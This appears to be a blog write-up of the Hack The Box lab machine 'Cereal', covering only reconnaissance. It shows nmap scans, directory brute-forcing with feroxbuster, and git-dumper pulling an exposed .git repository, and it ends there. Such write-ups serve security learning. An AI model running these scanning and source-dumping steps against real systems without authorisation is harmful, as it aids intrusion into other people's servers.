---
title: Cereal
date: 2026-05-20
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
lastmod: 2026-05-28T06:42:59.740Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Cereal" >}}

***

# Recon

### PORT & IP SCAN

summary the openport only with One-Paragraph -- AI

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo nmap  -p-  -vv -reason -T 5  -o openPort.txt 10.129.35.230                    
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-19 23:37 -0400
Initiating Ping Scan at 23:37
Scanning 10.129.35.230 [4 ports]
Completed Ping Scan at 23:37, 0.33s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:37
Completed Parallel DNS resolution of 1 host. at 23:37, 0.50s elapsed
Initiating SYN Stealth Scan at 23:37
Scanning 10.129.35.230 [65535 ports]
Discovered open port 80/tcp on 10.129.35.230
Discovered open port 22/tcp on 10.129.35.230
Discovered open port 443/tcp on 10.129.35.230
SYN Stealth Scan Timing: About 4.22% done; ETC: 23:49 (0:11:44 remaining)
SYN Stealth Scan Timing: About 11.42% done; ETC: 23:46 (0:07:53 remaining)
SYN Stealth Scan Timing: About 21.38% done; ETC: 23:44 (0:05:35 remaining)
SYN Stealth Scan Timing: About 33.31% done; ETC: 23:43 (0:04:02 remaining)
SYN Stealth Scan Timing: About 44.71% done; ETC: 23:42 (0:03:07 remaining)
SYN Stealth Scan Timing: About 59.52% done; ETC: 23:42 (0:02:03 remaining)
SYN Stealth Scan Timing: About 72.95% done; ETC: 23:41 (0:01:18 remaining)
SYN Stealth Scan Timing: About 86.37% done; ETC: 23:41 (0:00:38 remaining)
Completed SYN Stealth Scan at 23:41, 264.45s elapsed (65535 total ports)
Nmap scan report for 10.129.35.230
Host is up, received syn-ack ttl 127 (0.23s latency).
Scanned at 2026-05-19 23:37:06 EDT for 265s
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 127
80/tcp  open  http    syn-ack ttl 127
443/tcp open  https   syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 265.45 seconds
           Raw packets sent: 131246 (5.775MB) | Rcvd: 179 (7.876KB)



┌──(root㉿kali)-[~/Desktop]
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.35.230  -oN serviceScan.txt 

Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-19 23:42 -0400
Nmap scan report for 10.129.35.230
Host is up (0.25s latency).

PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac (RSA)
|   256 fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac (ECDSA)
|_  256 cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e (ED25519)
80/tcp  open  http       Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://10.129.35.230/
443/tcp open  ssl/https?
|_ssl-date: 2026-05-20T03:43:44+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=cereal.htb
| Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
| Not valid before: 2020-11-11T19:57:18
|_Not valid after:  2040-11-11T20:07:19
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.97 seconds
                                                                             
```

```
┌──(root㉿kali)-[~/Desktop]
└─# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.129.96.60  MULTIMASTER.MEGACORP.LOCAL MEGACORP.LOCAL MULTIMASTER
dead:beef::b885:d62a:d679:573f     apt.htb APT.htb.local  htb.local APT
10.129.35.230   cereal.htb source.cereal.htb

# Added by Docker Desktop
# To allow the same kube context to work on the host and the container:
127.0.0.1       kubernetes.docker.internal
# End of section

```

### Web 443 https://source.cereal.htb/

![Pasted image 20260520114756.png](/ob/Pasted%20image%2020260520114756.png)

out the  Source Error:

```
┌──(root㉿kali)-[~/Desktop]
└─# feroxbuster -k -u https://source.cereal.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt 
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://source.cereal.htb/
 🚩  In-Scope Url          │ source.cereal.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
500      GET      128l      496w    10090c https://source.cereal.htb/
301      GET        2l       10w      157c https://source.cereal.htb/uploads => https://source.cereal.htb/uploads/
301      GET        2l       10w      163c https://source.cereal.htb/aspnet_client => https://source.cereal.htb/aspnet_client/
404      GET       57l      226w     2955c https://source.cereal.htb/con
404      GET       57l      226w     2963c https://source.cereal.htb/uploads/con
404      GET       57l      226w     2969c https://source.cereal.htb/aspnet_client/con
404      GET       57l      226w     2955c https://source.cereal.htb/aux
404      GET       57l      226w     2963c https://source.cereal.htb/uploads/aux
404      GET       57l      226w     2969c https://source.cereal.htb/aspnet_client/aux
301      GET        2l       10w      174c https://source.cereal.htb/aspnet_client/system_web => https://source.cereal.htb/aspnet_client/system_web/
404      GET       57l      226w     2980c https://source.cereal.htb/aspnet_client/system_web/con
404      GET       57l      226w     2980c https://source.cereal.htb/aspnet_client/system_web/aux
[####################] - 4m     71090/71090   0s      found:12      errors:0      
[####################] - 3m     17770/17770   110/s   https://source.cereal.htb/ 
[####################] - 3m     17770/17770   110/s   https://source.cereal.htb/aspnet_client/ 
[####################] - 3m     17770/17770   110/s   https://source.cereal.htb/uploads/ 
[####################] - 2m     17770/17770   155/s   https://source.cereal.htb/aspnet_client/system_web/     
```

I forget to do the nmap again when I have the subdomain again

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo nmap  -p-  -vv -reason -T 5  -o openPort.txt source.cereal.htb                               
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-19 23:59 -0400
Initiating Ping Scan at 23:59
Scanning source.cereal.htb (10.129.35.230) [4 ports]
Completed Ping Scan at 23:59, 0.28s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:59
Scanning source.cereal.htb (10.129.35.230) [65535 ports]
Discovered open port 443/tcp on 10.129.35.230
Discovered open port 80/tcp on 10.129.35.230
Discovered open port 22/tcp on 10.129.35.230
SYN Stealth Scan Timing: About 7.93% done; ETC: 00:05 (0:06:00 remaining)
SYN Stealth Scan Timing: About 19.74% done; ETC: 00:04 (0:04:08 remaining)
SYN Stealth Scan Timing: About 33.07% done; ETC: 00:03 (0:03:04 remaining)
SYN Stealth Scan Timing: About 48.95% done; ETC: 00:03 (0:02:06 remaining)
SYN Stealth Scan Timing: About 64.87% done; ETC: 00:03 (0:01:22 remaining)
SYN Stealth Scan Timing: About 81.80% done; ETC: 00:02 (0:00:40 remaining)
Completed SYN Stealth Scan at 00:02, 215.01s elapsed (65535 total ports)
Nmap scan report for source.cereal.htb (10.129.35.230)
Host is up, received echo-reply ttl 127 (0.23s latency).
rDNS record for 10.129.35.230: cereal.htb
Scanned at 2026-05-19 23:59:07 EDT for 215s
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 127
80/tcp  open  http    syn-ack ttl 127
443/tcp open  https   syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 215.45 seconds
           Raw packets sent: 131213 (5.773MB) | Rcvd: 146 (6.408KB)

```

### git

```
┌──(root㉿kali)-[~/Desktop]
└─#  sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 source.cereal.htb  -oN serviceScan.txt 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-20 00:55 -0400
Nmap scan report for source.cereal.htb (10.129.35.230)
Host is up (0.19s latency).
rDNS record for 10.129.35.230: cereal.htb

PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac (RSA)
|   256 fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac (ECDSA)
|_  256 cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e (ED25519)
80/tcp  open  http       Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-git: 
|   10.129.35.230:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Some changes 
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Compilation Error
443/tcp open  ssl/https?
|_ssl-date: 2026-05-20T04:56:20+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=cereal.htb
| Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
| Not valid before: 2020-11-11T19:57:18
|_Not valid after:  2040-11-11T20:07:19
| tls-alpn: 
|   h2
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.36 seconds

```

But it’s much easier to use gitdumper from GitTools. I’ve used this before on Travel and Dyplesher. After cloning the repo, I’ll give it the url and an output directory:

```
┌──(root㉿kali)-[~/Desktop]
└─# uv pip install git-dumper 
Resolved 15 packages in 1.10s
Prepared 10 packages in 976ms
Installed 15 packages in 74ms
 + beautifulsoup4==4.14.3
 + certifi==2026.4.22
 + cffi==2.0.0
 + charset-normalizer==3.4.7
 + cryptography==48.0.0
 + dulwich==1.2.1
 + git-dumper==1.0.9
 + idna==3.15
 + pycparser==3.0
 + pysocks==1.7.1
 + requests==2.34.2
 + requests-pkcs12==1.27
 + soupsieve==2.8.3
 + typing-extensions==4.15.0
 + urllib3==2.7.0
```

```
┌──(root㉿kali)-[~/Desktop]
└─# uv run git-dumper https://source.cereal.htb/.git/ . 
Warning: Destination '.' is not empty
[-] Testing https://source.cereal.htb/.git/HEAD [200]
[-] Testing https://source.cereal.htb/.git/ [403]
[-] Fetching common files
[-] Fetching https://source.cereal.htb/.gitignore [404]
[-] https://source.cereal.htb/.gitignore responded with status code 404
[-] Fetching https://source.cereal.htb/.git/description [200]
[-] Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample [404]
[-] https://source.cereal.htb/.git/hooks/applypatch-msg.sample responded with status code 404
[-] Fetching https://source.cereal.htb/.git/hooks/post-commit.sample [404]
[-] https://source.cereal.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching https://source.cereal.htb/.git/hooks/commit-msg.sample [404]
[-] https://source.cereal.htb/.git/hooks/commit-msg.sample responded with status code 404
[-] Fetching https://source.cereal.htb/.git/hooks/post-receive.sample [404]
[-] https://source.cereal.htb/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching https://source.cereal.htb/.git/hooks/post-update.sample [404]
[-] https://source.cereal.htb/.git/hooks/post-update.sample responded with status code 404
[-] Fetching https://source.cereal.htb/.git/hooks/pre-applypatch.sample [404]
[-] https://source.cereal.htb/.git/hooks/pre-applypatch.sample responded with status code 404
[-] Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching https://source.cereal.htb/.git/hooks/pre-commit.sample [404]
[-] https://source.cereal.htb/.git/hooks/pre-commit.sample responded with status code 404
[-] Fetching https://source.cereal.htb/.git/hooks/pre-rebase.sample [404]
[-] https://source.cereal.htb/.git/hooks/pre-rebase.sample responded with status code 404
[-] Fetching https://source.cereal.htb/.git/hooks/pre-push.sample [404]
[-] https://source.cereal.htb/.git/hooks/pre-push.sample responded with status code 404
[-] Fetching https://source.cereal.htb/.git/hooks/pre-receive.sample [404]
[-] https://source.cereal.htb/.git/hooks/pre-receive.sample responded with status code 404
[-] Fetching https://source.cereal.htb/.git/hooks/update.sample [404]
[-] https://source.cereal.htb/.git/hooks/update.sample responded with status code 404
[-] Fetching https://source.cereal.htb/.git/hooks/prepare-commit-msg.sample [404]
[-] https://source.cereal.htb/.git/hooks/prepare-commit-msg.sample responded with status code 404
[-] Fetching https://source.cereal.htb/.git/index [200]
[-] Fetching https://source.cereal.htb/.git/objects/info/packs [404]
[-] https://source.cereal.htb/.git/objects/info/packs responded with status code 404
[-] Fetching https://source.cereal.htb/.git/info/exclude [200]
[-] Finding refs/
[-] Fetching https://source.cereal.htb/.git/ORIG_HEAD [404]
[-] https://source.cereal.htb/.git/ORIG_HEAD responded with status code 404
[-] Fetching https://source.cereal.htb/.git/config [200]
[-] Fetching https://source.cereal.htb/.git/FETCH_HEAD [404]
[-] https://source.cereal.htb/.git/FETCH_HEAD responded with status code 404
[-] Fetching https://source.cereal.htb/.git/HEAD [200]
[-] Fetching https://source.cereal.htb/.git/logs/refs/heads/staging [404]
[-] https://source.cereal.htb/.git/logs/refs/heads/staging responded with status code 404
[-] Fetching https://source.cereal.htb/.git/logs/refs/heads/main [404]
[-] https://source.cereal.htb/.git/logs/refs/heads/main responded with status code 404
[-] Fetching https://source.cereal.htb/.git/logs/refs/heads/master [200]
[-] Fetching https://source.cereal.htb/.git/info/refs [404]
[-] Fetching https://source.cereal.htb/.git/logs/refs/heads/production [404]
[-] https://source.cereal.htb/.git/info/refs responded with status code 404
[-] https://source.cereal.htb/.git/logs/refs/heads/production responded with status code 404
[-] Fetching https://source.cereal.htb/.git/logs/HEAD [200]
[-] Fetching https://source.cereal.htb/.git/logs/refs/heads/development [404]
[-] Fetching https://source.cereal.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] https://source.cereal.htb/.git/logs/refs/heads/development responded with status code 404
[-] https://source.cereal.htb/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching https://source.cereal.htb/.git/logs/refs/remotes/origin/master [404]
[-] https://source.cereal.htb/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching https://source.cereal.htb/.git/logs/refs/remotes/origin/main [404]
[-] https://source.cereal.htb/.git/logs/refs/remotes/origin/main responded with status code 404
[-] Fetching https://source.cereal.htb/.git/logs/refs/remotes/origin/production [404]
[-] https://source.cereal.htb/.git/logs/refs/remotes/origin/production responded with status code 404
[-] Fetching https://source.cereal.htb/.git/logs/refs/stash [404]
[-] Fetching https://source.cereal.htb/.git/logs/refs/remotes/origin/development [404]
[-] https://source.cereal.htb/.git/logs/refs/stash responded with status code 404
[-] https://source.cereal.htb/.git/logs/refs/remotes/origin/development responded with status code 404
[-] Fetching https://source.cereal.htb/.git/logs/refs/remotes/origin/staging [404]
[-] https://source.cereal.htb/.git/logs/refs/remotes/origin/staging responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/heads/main [404]
[-] Fetching https://source.cereal.htb/.git/packed-refs [404]
[-] https://source.cereal.htb/.git/refs/heads/main responded with status code 404
[-] https://source.cereal.htb/.git/packed-refs responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/heads/staging [404]
[-] https://source.cereal.htb/.git/refs/heads/staging responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/heads/production [404]
[-] https://source.cereal.htb/.git/refs/heads/production responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/heads/master [200]
[-] Fetching https://source.cereal.htb/.git/refs/heads/development [404]
[-] Fetching https://source.cereal.htb/.git/refs/remotes/origin/master [404]
[-] https://source.cereal.htb/.git/refs/remotes/origin/master responded with status code 404
[-] https://source.cereal.htb/.git/refs/heads/development responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/remotes/origin/main [404]
[-] https://source.cereal.htb/.git/refs/remotes/origin/main responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/remotes/origin/production [404]
[-] https://source.cereal.htb/.git/refs/remotes/origin/production responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/remotes/origin/HEAD [404]
[-] Fetching https://source.cereal.htb/.git/refs/remotes/origin/staging [404]
[-] https://source.cereal.htb/.git/refs/remotes/origin/staging responded with status code 404
[-] https://source.cereal.htb/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/remotes/origin/development [404]
[-] https://source.cereal.htb/.git/refs/remotes/origin/development responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/stash [404]
[-] https://source.cereal.htb/.git/refs/stash responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/wip/wtree/refs/heads/main [404]
[-] https://source.cereal.htb/.git/refs/wip/wtree/refs/heads/main responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] Fetching https://source.cereal.htb/.git/refs/wip/wtree/refs/heads/development [404]
[-] https://source.cereal.htb/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] https://source.cereal.htb/.git/refs/wip/wtree/refs/heads/development responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/wip/wtree/refs/heads/production [404]
[-] https://source.cereal.htb/.git/refs/wip/wtree/refs/heads/production responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/wip/wtree/refs/heads/staging [404]
[-] https://source.cereal.htb/.git/refs/wip/wtree/refs/heads/staging responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/wip/index/refs/heads/master [404]
[-] https://source.cereal.htb/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/wip/index/refs/heads/staging [404]
[-] https://source.cereal.htb/.git/refs/wip/index/refs/heads/staging responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/wip/index/refs/heads/main [404]
[-] Fetching https://source.cereal.htb/.git/refs/wip/index/refs/heads/production [404]
[-] https://source.cereal.htb/.git/refs/wip/index/refs/heads/main responded with status code 404
[-] https://source.cereal.htb/.git/refs/wip/index/refs/heads/production responded with status code 404
[-] Fetching https://source.cereal.htb/.git/refs/wip/index/refs/heads/development [404]
[-] https://source.cereal.htb/.git/refs/wip/index/refs/heads/development responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching https://source.cereal.htb/.git/objects/e0/d535e8a009bf92ddc8fa2b06d94d7842d2580c [200]
[-] Fetching https://source.cereal.htb/.git/objects/d1/e80a84249956da6e480335a2099909ee77c201 [200]
[-] Fetching https://source.cereal.htb/.git/objects/7a/fce55a9dd5080e0983cdfc81547e28f4c27ecd [200]
[-] Fetching https://source.cereal.htb/.git/objects/60/08df66cd26001f974b5694e5bea8110ad5bf44 [200]
[-] Fetching https://source.cereal.htb/.git/objects/f3/4f63c8ba8e752d035a279456524ad2ffbc038f [200]
[-] Fetching https://source.cereal.htb/.git/objects/3e/7da00c3be30c6d536fdd416af8b20e339a333f [200]
[-] Fetching https://source.cereal.htb/.git/objects/05/3a5e841b196ce0dcb80edffdd9c2bd0dee4bd9 [200]
[-] Fetching https://source.cereal.htb/.git/objects/4d/4eeb5474e0d4d3f124ce1fb69c47f379a70778 [200]
[-] Fetching https://source.cereal.htb/.git/objects/52/a0dddbe891213777d861b1b16f1e3809f80070 [200]
[-] Fetching https://source.cereal.htb/.git/objects/d3/b17e0318b1ebcd9c765415ee8269fd4ebe8c6e [200]
[-] Fetching https://source.cereal.htb/.git/objects/54/92025268bebe195c2de5e76a022d5b1baa4e7a [200]
[-] Fetching https://source.cereal.htb/.git/objects/04/0628624f5c00b9076ba79219eb9ff80c838a7e [200]
[-] Fetching https://source.cereal.htb/.git/objects/97/49e9e09c1052e8924b1b5b1e086e5234fdb117 [200]
[-] Fetching https://source.cereal.htb/.git/objects/b6/d91086606accbaff121f68203931b4876401c4 [200]
[-] Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 [200]
[-] Fetching https://source.cereal.htb/.git/objects/6f/92b9565570463a840d01c6ca4f29519392b455 [200]
[-] Fetching https://source.cereal.htb/.git/objects/3a/23ffe921530036a4e0c355e6c8d1d4029cb728 [200]
[-] Fetching https://source.cereal.htb/.git/objects/f3/f30289897876514073a6458049be046267c940 [200]
[-] Fetching https://source.cereal.htb/.git/objects/7b/d9533a2e01ec11dfa928bd491fe516477ed291 [200]
[-] Fetching https://source.cereal.htb/.git/objects/b4/3e98f00c85c1634da283c313d5d708ee0f1a69 [200]
[-] Fetching https://source.cereal.htb/.git/objects/4d/29575de80483b005c29bfcac5061cd2f45313e [200]
[-] Fetching https://source.cereal.htb/.git/objects/ca/f36214d57c4e858c8cc4bdf07a5f87cba2452b [200]
[-] Fetching https://source.cereal.htb/.git/objects/62/5425d88812f289bde78702dfe02a9aa3f80f31 [200]
[-] Fetching https://source.cereal.htb/.git/objects/6e/623603cf20966141f687a5bf74856eee23f1a0 [200]
[-] Fetching https://source.cereal.htb/.git/objects/c0/800794a31521f6d17ceb38d98a1f031c30c500 [200]
[-] Fetching https://source.cereal.htb/.git/objects/80/0407ac29116359643eac01b036e97d8aaa3a89 [200]
[-] Fetching https://source.cereal.htb/.git/objects/3b/31cc413d3a45c27b57043b448ef24349dcaa16 [200]
[-] Fetching https://source.cereal.htb/.git/objects/93/42f378e1ffe1ae68d98fe4fbcae91274006e4c [200]
[-] Fetching https://source.cereal.htb/.git/objects/18/66b3620afa30cb7586bf253a3c06053a848875 [200]
[-] Fetching https://source.cereal.htb/.git/objects/03/970fa8cb1c7ea06739491a45088d78de12595d [200]
[-] Fetching https://source.cereal.htb/.git/objects/e2/1bc7e6ea748950f112c2762090212912212004 [200]
[-] Fetching https://source.cereal.htb/.git/objects/69/6cd3f14587dfaa7fecb35962e39522ec216a42 [200]
[-] Fetching https://source.cereal.htb/.git/objects/2a/a36880e341fbe1a51d24a99ba2985c8f611daa [200]
[-] Fetching https://source.cereal.htb/.git/objects/1f/244ac8ec487d49041aeaee1a50e7622fc102b5 [200]
[-] Fetching https://source.cereal.htb/.git/objects/96/29ae910d02dab5a8c49427446dc5d722f0c13a [200]
[-] Fetching https://source.cereal.htb/.git/objects/01/b0f9a10733b39c3bbeba1ccb1521d866f8e3a5 [200]
[-] Fetching https://source.cereal.htb/.git/objects/85/72f6bd7120cb29e67ffc06e84f4c75aa9f74bd [200]
[-] Fetching https://source.cereal.htb/.git/objects/11/35057c43acd97a6f852427729f87a2b74c37c2 [200]
[-] Fetching https://source.cereal.htb/.git/objects/08/0d6c77ac21bb2ef88a6992b2b73ad93daaca92 [200]
[-] Fetching https://source.cereal.htb/.git/objects/7d/b80672d84b00aecb35c9020307d710c18ae0ee [200]
[-] Fetching https://source.cereal.htb/.git/objects/34/b68232714f841a274050591ff5595dcf7f85da [200]
[-] Fetching https://source.cereal.htb/.git/objects/96/ca3b86e0f8cb5e5fd931beebaabd9069041d0f [200]
[-] Fetching https://source.cereal.htb/.git/objects/12/b234743480bb829bef580bb0801e260c509c59 [200]
[-] Fetching https://source.cereal.htb/.git/objects/f3/9bb0b7c0d2f01362b11346b0b8f5336a111704 [200]
[-] Fetching https://source.cereal.htb/.git/objects/71/054d6a97665f98b7fd400f1d290af85a58bdf6 [200]
[-] Fetching https://source.cereal.htb/.git/objects/62/9b6746ce541da9542d7804c3176df5b553cd3d [200]
[-] Fetching https://source.cereal.htb/.git/objects/a3/bda5b44fe608753f3472166e1865f3f72fc478 [200]
[-] Fetching https://source.cereal.htb/.git/objects/a3/b2cccb3488ce24308898f9228e5a85f10447f7 [200]
[-] Fetching https://source.cereal.htb/.git/objects/2b/07af2aae5246bb8f6d18a10968445c66d2ef36 [200]
[-] Fetching https://source.cereal.htb/.git/objects/5f/282702bb03ef11d7184d19c80927b47f919764 [200]
[-] Fetching https://source.cereal.htb/.git/objects/a0/3f4d39ffcd36094da0d951440721b2838d21ba [200]
[-] Fetching https://source.cereal.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] https://source.cereal.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching https://source.cereal.htb/.git/objects/0b/c60840091d0ed5d036623fe7302bf742257523 [200]
[-] Fetching https://source.cereal.htb/.git/objects/46/9dafd23e93c5b666528d3fb1f50a2a2bd321d9 [200]
[-] Fetching https://source.cereal.htb/.git/objects/62/9039e5affe8208e1154b67708101da8910e0f9 [200]
[-] Fetching https://source.cereal.htb/.git/objects/5a/2512a408eed8f61d071eef2882a88b3b85b18e [200]
[-] Fetching https://source.cereal.htb/.git/objects/85/9d27a647f435d0598acd85db37e1af266e90be [200]
[-] Fetching https://source.cereal.htb/.git/objects/00/644543dce81cbf8f3a7adb5417c50aaa915511 [200]
[-] Fetching https://source.cereal.htb/.git/objects/6b/2adcc469b756b2dcfda13276a6ba1916877846 [200]
[-] Fetching https://source.cereal.htb/.git/objects/17/bea76b89c86c586914d690c423a911b1997f37 [200]
[-] Fetching https://source.cereal.htb/.git/objects/e9/ac3af6a45974ca8f2e461c7ad91449575df7d8 [200]
[-] Fetching https://source.cereal.htb/.git/objects/93/8b4c0455528be0db02057aa0c5568671a53218 [200]
[-] Fetching https://source.cereal.htb/.git/objects/d6/f8bc1367c8049e3db89b8af70a4209adf70f3c [200]
[-] Fetching https://source.cereal.htb/.git/objects/f4/5e0be32ec0d8c5b32ca2d271072ba1f8d0de16 [200]
[-] Fetching https://source.cereal.htb/.git/objects/6a/7c205202ed8b596e8419d486cbd67dc2af789a [200]
[-] Fetching https://source.cereal.htb/.git/objects/43/6f71cb66c390d8a900b0aacfb1615fcc81a5db [200]
[-] Fetching https://source.cereal.htb/.git/objects/f4/3b1b443e68d9c9de36f0a87e4bf8ccd17f4587 [200]
[-] Fetching https://source.cereal.htb/.git/objects/81/c62b19e54ca7d36ec27d04a2af50fbfe43c02a [200]
[-] Fetching https://source.cereal.htb/.git/objects/82/fa898ee18055693c512ee620efb2ccdd7c4012 [200]
[-] Fetching https://source.cereal.htb/.git/objects/cb/ed7de2821f50a0ac57b3ff2f296d93106f84c7 [200]
[-] Fetching https://source.cereal.htb/.git/objects/33/9fd07ed9da823adaf4ee85832f4c2765943d65 [200]
[-] Fetching https://source.cereal.htb/.git/objects/32/cd1066f6da2d64cf146f75c86f879bd73afe69 [200]
[-] Fetching https://source.cereal.htb/.git/objects/97/71e14d32cb8accd475fd3884c047bee06da678 [200]
[-] Fetching https://source.cereal.htb/.git/objects/be/0463f8abc082668b12d8f4bcba023bc5af8fd6 [200]
[-] Fetching https://source.cereal.htb/.git/objects/23/23379e9a7730e9684cd915d1f978d5ddf3862c [200]
[-] Fetching https://source.cereal.htb/.git/objects/39/3c210b4d91703164a1046e5be648d39ee62723 [200]
[-] Fetching https://source.cereal.htb/.git/objects/1b/1e1834980b71b7e0fc54a4ba6b05e311957451 [200]
[-] Fetching https://source.cereal.htb/.git/objects/d1/cf5e9c9945dfc56c0a7e5d3abd12c41de44235 [200]
[-] Fetching https://source.cereal.htb/.git/objects/48/5bdea4ac59141ada7f31edcf30cc044a0bfc12 [200]
[-] Fetching https://source.cereal.htb/.git/objects/9f/2579c0f86e6f37eece053c1efa3958487f484e [200]
[-] Fetching https://source.cereal.htb/.git/objects/a0/2cd88480dac2e482f9a34f72ba1972f992e6af [200]
[-] Fetching https://source.cereal.htb/.git/objects/6c/8c2f347d3cc0861008669914918b0ca887e99a [200]
[-] Fetching https://source.cereal.htb/.git/objects/d4/26ac61b29d9ea55ce824e037527c65bbe53ac0 [200]
[-] Fetching https://source.cereal.htb/.git/objects/fb/db64f95bda138a1b42d5b6916b1d746e0fd1d8 [200]
[-] Fetching https://source.cereal.htb/.git/objects/12/2c7096e7a9e3d2c14df6c9760c96ec2b1dd1be [200]
[-] Fetching https://source.cereal.htb/.git/objects/bd/6dd3e9b90ffdac8898e99214a1d98e81694521 [200]
[-] Fetching https://source.cereal.htb/.git/objects/27/6631a63a3319530a1e49dfa993ae60182075bf [200]
[-] Fetching https://source.cereal.htb/.git/objects/60/f1b7461349cbf36fa61b2df52e8bfe7cabf6fe [200]
[-] Fetching https://source.cereal.htb/.git/objects/77/6eedb6244bb3d03acb98d907e88e28d73c7485 [200]
[-] Fetching https://source.cereal.htb/.git/objects/e7/db1f81ef847c7e9ebe8af0c89e9f1c179c9e87 [200]
[-] Fetching https://source.cereal.htb/.git/objects/6f/dd936c603ec173834f5ffbd8fb3415cd493072 [200]
[-] Fetching https://source.cereal.htb/.git/objects/f1/e13ddddeab20c22c7a47a4453ae796d36f0a51 [200]
[-] Fetching https://source.cereal.htb/.git/objects/d9/6b9a3f8c8ea7aabb6456d068923b8784f66449 [200]
